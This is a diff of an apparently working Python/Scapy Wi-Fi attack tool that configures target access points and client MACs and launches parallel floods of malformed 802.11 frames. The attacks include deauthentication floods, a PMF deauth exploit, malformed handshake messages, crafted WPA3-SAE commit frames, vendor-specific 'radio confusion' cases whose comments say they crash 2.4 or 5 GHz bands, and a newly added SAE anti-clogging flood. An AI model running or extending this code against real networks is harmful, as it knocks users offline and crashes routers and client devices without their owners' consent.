@@ -18,19 +18,27 @@ import glob
 import random
 from multiprocessing import Process, Value
 
-# 
 # =====================================================================================
-# ======================== CENTRAL CONFIGURATION (EVERYTHING IN ONE PLACE) ========================
+# ======================== CENTRAL CONFIGURATION ======================================
 # =====================================================================================
 
 # --- 1. TARGET DATA ---
-TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"
-TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"
+TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
+TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"
 
-# --- 2. SCANNER / MANUAL CHANNELS ---
+# --- 2. SAE PARAMETERS (EXTRACTED VIA WIRESHARK) ---
+# IMPORTANT: Enter DIFFERENT values for 2.4 GHz and 5 GHz!
+
+# > Parameters for 2.4 GHz Network
+SAE_SCALAR_2_4_HEX = 'INSERT_2_4_SCALAR_HERE' # Example: '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
+SAE_FINITE_2_4_HEX = 'INSERT_2_4_FINITE_HERE' # Example: '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'
+
+# > Parameters for 5 GHz Network
+SAE_SCALAR_5_HEX = 'INSERT_5_SCALAR_HERE'
+SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'
+
+# --- 3. SCANNER / MANUAL CHANNELS ---
 SCANNER_INTERFACE = "wlan0mon"  # e.g. "wlan1mon"
-
-# --- 3. MANUAL CHANNEL ASSIGNMENT (Required without scanner) ---
 MANUELLER_KANAL_5GHZ = "36"
 MANUELLER_KANAL_2_4GHZ = "1"
 
@@ -38,11 +46,9 @@ MANUELLER_KANAL_2_4GHZ = "1"
 
 # Clients for GENERAL attacks (deauth_flood, pmf_deauth_exploit, malformed...)
 TARGET_STA_MACS = [
-    "30:34:DB:11:48:09",
-    "06:B2:AA:AC:5D:31",
-#    "6C:99:9D:95:70:8F",
-    "6E:8F:9F:B4:3D:10"#,
-#    "82:49:2C:43:16:81"
+#    "AA:BB:CC:DD:EE:11",         Remove # to set the MAC address!
+#    "AA:BB:CC:DD:EE:11",
+#    "AA:BB:CC:DD:EE:11"
 ]
 
 # GROUP A: TARGET IS 5 GHz (The 5 GHz band should crash)
@@ -50,12 +56,9 @@ TARGET_STA_MACS = [
 # - case6_radio_confusion (Standard)
 # - case13_radio_confusion_mediatek_reverse (Reverse)
 TARGET_STA_MACS_5GHZ_SPECIAL = [
-#    "6E:8F:9F:B4:3D:10"#,
-#    "30:34:DB:11:48:09",
-#    "64:67:72:81:9C:6E",    
-    "4E:17:88:DD:E6:83",
-#    "B2:5D:F9:73:10:6C",
-    "56:01:B3:1E:8C:08"
+#    "AA:BB:CC:DD:EE:11",       Remove # to set the MAC address!
+#    "AA:BB:CC:DD:EE:11",
+#    "AA:BB:CC:DD:EE:11"
 ]
 
 # GROUP B: TARGET IS 2.4 GHz (The 2.4 GHz band should crash)
@@ -63,12 +66,9 @@ TARGET_STA_MACS_5GHZ_SPECIAL = [
 # - case6_radio_confusion_reverse (Reverse)
 # - case13_radio_confusion_mediatek (Standard)
 TARGET_STA_MACS_2_4GHZ_SPECIAL = [
-    "30:34:DB:11:48:09"#,
-#    "6E:8F:9F:B4:3D:10"#,    
-#    "6C:99:9D:95:70:8F",
-#    "64:67:72:81:9C:6E",
-#    "56:01:B3:1E:8C:08"    
-#    "B2:5D:F9:73:10:6C"
+#    "AA:BB:CC:DD:EE:11",         Remove # to set the MAC address!
+#    "AA:BB:CC:DD:EE:11",     
+#    "AA:BB:CC:DD:EE:11"
 ]
 # ====================== COMPLETE ENCYCLOPEDIA OF ATTACKS ======================
 #
@@ -140,21 +140,13 @@ TARGET_STA_MACS_2_4GHZ_SPECIAL = [
 #
 #    Case 6 (Reverse) = Case 13 (Standard) = Both crash 2.4 GHz.
 # ==============================================================================================
-# --- CENTRAL ADAPTER & ATTACK CONFIGURATION ---
+# --- 5. ADAPTER & ATTACK CONFIGURATION ---
 ADAPTER_KONFIGURATION = {
-#    "wlan1mon": {"band": "5GHz", "angriff": "case1_denial_of_internet"},
-#    "wlan2mon": {"band": "5GHz", "angriff": "case2_bad_auth_algo_broadcom"},
-#    "wlan11mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"},
-    "wlan5mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"},
-#    "wlan2mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
+#   "wlan1mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"}, # Remove # so set! 
     "wlan2mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
-    "wlan3mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"}#,
-#    "wlan1": {"band": "2.4GHz", "angriff": "case13_radio_confusion_mediatek_reverse"}    
+#   "wlan3mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"},         # Remove # so set! 
+    "wlan4mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"}
 }
-
-# --- SAE PARAMETERS ---
-SAE_SCALAR_HEX = '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
-SAE_FINITE_ELEMENT_HEX = '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'
 
 # =====================================================================================
 # ======================== HELPER FUNCTIONS ========================
@@ -163,70 +155,29 @@ SAE_FINITE_ELEMENT_HEX = '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403ae
 def set_channel(interface, channel):
     try:
         subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)], check=True, capture_output=True, text=True, timeout=5)
+        time.sleep(0.1)
         return True
-      # INSERT HERE: Short wait time for hardware
-        time.sleep(0.1) 
-    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
-        print(f"\n[ERROR] {interface}: Channel switch to {channel} failed: {e.stderr.strip() if hasattr(e, 'stderr') and e.stderr else e}")
-        return False
-
-def initialize_interfaces(adapter_config):
-    print("\n[INFO] Initializing attack interfaces...")
-    for interface in adapter_config.keys():
+    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
         try:
-            print(f"[INFO] Configuring {interface}...")
-            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True, capture_output=True)
-            subprocess.run(['iw', interface, 'set', 'monitor', 'control'], check=True, capture_output=True)
-            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True, capture_output=True)
-            print(f"[INFO] {interface} is now in monitor mode and active.")
-        except subprocess.CalledProcessError as e:
-            sys.exit(f"[ERROR] Could not initialize {interface}: {e.stderr.decode().strip()}")
-    return True
+            subprocess.run(['iwconfig', interface, 'channel', str(channel)], check=True, capture_output=True, text=True)
+            time.sleep(0.1)
+            return True
+        except:
+            print(f"[ERROR] Could not set channel {channel} on {interface}")
+            return False
 
 def get_target_info_from_csv(csv_file_path, all_target_stas):
     info = {'aps': {}, 'clients': {'5ghz': [], '2.4ghz': []}}
-    all_stas_upper = {mac.upper() for mac in all_target_stas}
     try:
         with open(csv_file_path, 'r', errors='ignore') as f: lines = f.readlines()
-        
-        ap_section_identifier = "BSSID, First time seen"
-        client_section_identifier = "Station MAC, First time seen"
-        
-        in_ap_section = False
-        client_section_index = -1
-        
-        for i, line in enumerate(lines):
-            if ap_section_identifier in line:
-                in_ap_section = True
-                for j in range(i + 1, len(lines)):
-                    if client_section_identifier in lines[j]:
-                        client_section_index = j
-                        break
-                
-                ap_lines = lines[i+1 : client_section_index if client_section_index != -1 else len(lines)]
-                for ap_line in ap_lines:
-                    parts = [p.strip() for p in ap_line.split(',')]
-                    if len(parts) >= 4:
-                        bssid, channel_str = parts[0].upper(), parts[3]
-                        if channel_str.isdigit() and int(channel_str) > 0:
-                            channel = str(int(channel_str))
-                            if bssid == TARGET_BSSID_5GHZ.upper():
-                                info['aps']['5ghz'] = {'bssid': bssid, 'channel': channel}
-                            elif bssid == TARGET_BSSID_2_4GHZ.upper():
-                                info['aps']['2.4ghz'] = {'bssid': bssid, 'channel': channel}
-                
-                if client_section_index != -1:
-                    client_lines = lines[client_section_index+1:]
-                    for client_line in client_lines:
-                        parts = [p.strip() for p in client_line.split(',')]
-                        if len(parts) >= 6:
-                            sta_mac, ap_bssid = parts[0].upper(), parts[5].upper()
-                            if sta_mac in all_stas_upper:
-                                if ap_bssid == TARGET_BSSID_5GHZ.upper():
-                                    if sta_mac not in info['clients']['5ghz']: info['clients']['5ghz'].append(sta_mac)
-                                elif ap_bssid == TARGET_BSSID_2_4GHZ.upper():
-                                    if sta_mac not in info['clients']['2.4ghz']: info['clients']['2.4ghz'].append(sta_mac)
-                break
+        for line in lines:
+            parts = [p.strip() for p in line.split(',')]
+            if len(parts) >= 4:
+                bssid = parts[0].upper()
+                if bssid == TARGET_BSSID_5GHZ:
+                    info['aps']['5ghz'] = {'bssid': bssid, 'channel': parts[3]}
+                elif bssid == TARGET_BSSID_2_4GHZ:
+                    info['aps']['2.4ghz'] = {'bssid': bssid, 'channel': parts[3]}
     except Exception: pass
     return info
 
@@ -244,7 +195,7 @@ def cleanup(proc_dict):
     print("[INFO] Cleanup completed.")
 
 # =====================================================================================
-# ======================== ALL 26 ATTACK FUNCTIONS ========================
+# ======================== ATTACK FUNCTIONS (ALL 26) ========================
 # =====================================================================================
 
 # --- Vendor Specific Attacks ---
@@ -326,11 +277,13 @@ def run_case5_empty_frame_process(interface, counter, **kwargs):
 
 def run_case6_radio_confusion_process(interface, counter, **kwargs):
     from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    # Target is 5GHz, so we need 5GHz params, even if we shoot from 2.4GHz
     bssid_5ghz, channel_5ghz = kwargs['bssid_5ghz'], kwargs['channel_5ghz']
     bssid_2_4ghz, channel_2_4ghz = kwargs['bssid_2_4ghz'], kwargs['channel_2_4ghz']
     clients_5ghz = kwargs.get('clients', [])
     if not (bssid_5ghz and channel_5ghz and bssid_2_4ghz and channel_2_4ghz and clients_5ghz): return
     print(f"\n[INFO-CASE6] {interface}: Starting Radio Confusion (Target 5GHz)...")
+    # This attack uses the SAE payload valid for the TARGET band (5GHz)
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
@@ -350,6 +303,7 @@ def run_case6_radio_confusion_process(interface, counter, **kwargs):
 
 def run_case6_radio_confusion_reverse_process(interface, counter, **kwargs):
     from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    # Target is 2.4GHz, so we need 2.4GHz params
     bssid_5ghz, channel_5ghz = kwargs['bssid_5ghz'], kwargs['channel_5ghz']
     bssid_2_4ghz, channel_2_4ghz = kwargs['bssid_2_4ghz'], kwargs['channel_2_4ghz']
     clients_2_4ghz = kwargs.get('clients', [])
@@ -373,7 +327,6 @@ def run_case6_radio_confusion_reverse_process(interface, counter, **kwargs):
     except KeyboardInterrupt: pass
 
 def run_case7_back_to_the_future_process(interface, counter, **kwargs):
-    """Case 7: Overloading WPA2 AP with WPA3 packets"""
     from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs['bssid'], kwargs['channel']
     if not set_channel(interface, channel): return
@@ -419,10 +372,11 @@ def run_case9_bad_sequence_number_process(interface, counter, **kwargs):
     if not clients: return
     print(f"\n[INFO-CASE9] {interface}: Starting Bad Sequence Number...")
     if not set_channel(interface, channel): return
+    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0, 3]), seqnum=3, status=0)
+                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0, 3]), seqnum=3, status=0)/SAE_PAYLOAD
                 sendp(packet, count=20, inter=0.01, iface=interface, verbose=0)
                 with counter.get_lock(): counter.value += 20
             time.sleep(1)
@@ -529,12 +483,9 @@ def run_case13_radio_confusion_mediatek_reverse_process(interface, counter, **kw
             time.sleep(1)
     except KeyboardInterrupt: pass
 
-# =====================================================================================
-# ==================== CATEGORY 2: CLIENT DIRECT ATTACKS (NEW) =======================
-# =====================================================================================
+# --- Client Direct Attacks ---
 
 def run_deauth_flood_process(interface, counter, **kwargs):
-    """Deauth Flood: Classic Deauth Attack"""
     from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
     bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
     if not clients: return
@@ -553,7 +504,6 @@ def run_deauth_flood_process(interface, counter, **kwargs):
     except KeyboardInterrupt: pass
 
 def run_pmf_deauth_exploit_process(interface, counter, **kwargs):
-    """PMF Deauth Exploit: Exploits PMF protection mechanism against client"""
     from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
     bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
     if not clients: return
@@ -571,7 +521,6 @@ def run_pmf_deauth_exploit_process(interface, counter, **kwargs):
     except KeyboardInterrupt: pass
 
 def run_malformed_msg1_process(interface, counter, **kwargs):
-    """Malformed MSG1: Attacks client driver via 4-Way Handshake"""
     from scapy.all import sendp, RadioTap, Dot11, EAPOL
     bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
     if not clients: return
@@ -589,12 +538,9 @@ def run_malformed_msg1_process(interface, counter, **kwargs):
             time.sleep(1)
     except KeyboardInterrupt: pass
 
-# =====================================================================================
-# ==================== CATEGORY 3: GENERIC WPA3-SAE ATTACKS (NEW) ================
-# =====================================================================================
+# --- Generic WPA3-SAE Attacks ---
 
 def run_bad_algo_generic_process(interface, counter, **kwargs):
-    """Bad Algo (Generic): SAE Frame with invalid algorithm"""
     from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
@@ -608,7 +554,6 @@ def run_bad_algo_generic_process(interface, counter, **kwargs):
     except KeyboardInterrupt: pass
 
 def run_bad_seq_generic_process(interface, counter, **kwargs):
-    """Bad Seq (Generic): SAE Frame with invalid sequence number"""
     from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
@@ -623,7 +568,6 @@ def run_bad_seq_generic_process(interface, counter, **kwargs):
     except KeyboardInterrupt: pass
 
 def run_bad_status_code_generic_process(interface, counter, **kwargs):
-    """Bad Status Code (Generic): Invalid status code without specific payload"""
     from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
@@ -637,7 +581,6 @@ def run_bad_status_code_generic_process(interface, counter, **kwargs):
     except KeyboardInterrupt: pass
 
 def run_empty_frame_confirm_generic_process(interface, counter, **kwargs):
-    """Empty Frame Confirm (Generic): Generic empty SAE Confirm"""
     from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
@@ -648,6 +591,20 @@ def run_empty_frame_confirm_generic_process(interface, counter, **kwargs):
             sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
             with counter.get_lock(): counter.value += 20
             time.sleep(0.5)
+    except KeyboardInterrupt: pass
+
+def run_cookie_guzzler_process(interface, counter, **kwargs):
+    """Cookie Guzzler: SAE Flooding to trigger Anti-Clogging"""
+    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
+    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
+    if not set_channel(interface, channel): return
+    print(f"[INFO-COOKIE] {interface}: Starting Cookie Guzzler...")
+    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
+    try:
+        while True:
+            packet = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
+            sendp(packet, count=128, inter=0.0001, iface=interface, verbose=0)
+            with counter.get_lock(): counter.value += 128
     except KeyboardInterrupt: pass
 
 # =====================================================================================
@@ -716,6 +673,7 @@ def main():
             "malformed_msg1_length": run_malformed_msg1_process, "malformed_msg1_flags": run_malformed_msg1_process,
             "bad_algo": run_bad_algo_generic_process, "bad_seq": run_bad_seq_generic_process,
             "bad_status_code": run_bad_status_code_generic_process, "empty_frame_confirm": run_empty_frame_confirm_generic_process,
+            "cookie_guzzler": run_cookie_guzzler_process
         }
 
         for interface, config in ADAPTER_KONFIGURATION.items():
@@ -732,14 +690,52 @@ def main():
                 print(f"[WARNING] {interface}: Attack '{attack_type}' is unknown.")
                 continue
 
-            kwargs = { 'bssid': ap_info['bssid'], 'channel': ap_info['channel'], 'scalar_hex': SAE_SCALAR_HEX, 'finite_hex': SAE_FINITE_ELEMENT_HEX, 'attack_type': attack_type, 'clients': [] }
+            # SMART PARAMETER SELECTION
+            # Default: Use parameters of the adapter's band
+            scalar_to_use = SAE_SCALAR_5_HEX if band == '5GHz' else SAE_SCALAR_2_4_HEX
+            finite_to_use = SAE_FINITE_5_HEX if band == '5GHz' else SAE_FINITE_2_4_HEX
+
+            # Special Cases: Radio Confusion attacks (Case 6 / 13)
+            # Logic: If I am on 2.4GHz attacking 5GHz, I need 5GHz params.
+            # case6_radio_confusion: Adapter 2.4G -> Target 5G. Needs 5G Params.
+            if attack_type == "case6_radio_confusion":
+                scalar_to_use = SAE_SCALAR_5_HEX
+                finite_to_use = SAE_FINITE_5_HEX
+            # case6_radio_confusion_reverse: Adapter 5G -> Target 2.4G. Needs 2.4G Params.
+            elif attack_type == "case6_radio_confusion_reverse":
+                scalar_to_use = SAE_SCALAR_2_4_HEX
+                finite_to_use = SAE_FINITE_2_4_HEX
+            # case13_radio_confusion_mediatek: Adapter 5G -> Target 2.4G. Needs 2.4G Params.
+            elif attack_type == "case13_radio_confusion_mediatek":
+                scalar_to_use = SAE_SCALAR_2_4_HEX
+                finite_to_use = SAE_FINITE_2_4_HEX
+            # case13_radio_confusion_mediatek_reverse: Adapter 2.4G -> Target 5G. Needs 5G Params.
+            elif attack_type == "case13_radio_confusion_mediatek_reverse":
+                scalar_to_use = SAE_SCALAR_5_HEX
+                finite_to_use = SAE_FINITE_5_HEX
+
+            kwargs = { 
+                'bssid': ap_info['bssid'], 
+                'channel': ap_info['channel'], 
+                'scalar_hex': scalar_to_use, 
+                'finite_hex': finite_to_use, 
+                'attack_type': attack_type, 
+                'clients': [] 
+            }
             
+            # Pass all BSSID/Channel info for cross-band attacks
+            kwargs['bssid_5ghz'] = current_ap_targets.get('5ghz', {}).get('bssid')
+            kwargs['channel_5ghz'] = current_ap_targets.get('5ghz', {}).get('channel')
+            kwargs['bssid_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('bssid')
+            kwargs['channel_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('channel')
+
+            # Client Selection Logic
             if attack_type in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]: kwargs['clients'] = TARGET_STA_MACS_5GHZ_SPECIAL
             elif attack_type in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]: kwargs['clients'] = TARGET_STA_MACS_2_4GHZ_SPECIAL
-            elif attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm"]:
+            elif attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]:
                 kwargs['clients'] = TARGET_STA_MACS
 
-            needs_clients = "clients" in kwargs and attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm"]
+            needs_clients = "clients" in kwargs and attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]
             if needs_clients and not kwargs['clients']:
                 if SCANNER_INTERFACE:
                     found_clients = current_client_targets['5ghz'] if band == '5GHz' else current_client_targets['2.4ghz']
@@ -747,16 +743,10 @@ def main():
                         print(f"[WARNING] {interface} ({attack_type}): Requires clients, but scanner found none.")
                         continue
                     kwargs['clients'] = found_clients
-                else: # Manual mode needs pre-defined special clients
+                else: 
                     print(f"[WARNING] {interface} ({attack_type}): Requires clients, but none assigned in manual mode.")
                     continue
             
-            if 'case6' in attack_type or 'case13' in attack_type:
-                kwargs['bssid_5ghz'] = TARGET_BSSID_5GHZ
-                kwargs['channel_5ghz'] = current_ap_targets.get('5ghz', {}).get('channel')
-                kwargs['bssid_2_4ghz'] = TARGET_BSSID_2_4GHZ
-                kwargs['channel_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('channel')
-
             print(f"[START] {interface} ({band}): {attack_type} -> BSSID: {kwargs['bssid']}, Channel: {kwargs['channel']}")
             p = Process(target=target_func, args=(interface, counters[interface]), kwargs=kwargs)
             p.start()
